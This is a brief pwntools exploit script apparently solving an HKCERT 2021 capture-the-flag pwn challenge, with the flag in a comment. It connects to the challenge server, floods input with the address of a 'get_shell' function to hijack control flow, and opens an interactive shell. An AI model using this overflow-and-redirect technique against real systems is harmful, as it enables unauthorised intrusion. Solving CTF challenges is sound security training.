# hkcert21{be_c4r3_WIth_7he_5iZe}
from pwn import *

exe = ELF("./chall")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


target = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
target = remote("chalp.hkcert21.pwnable.hk", 28028)

target.sendline(p64(exe.sym['get_shell'])*32)

target.sendline("Y")


target.interactive()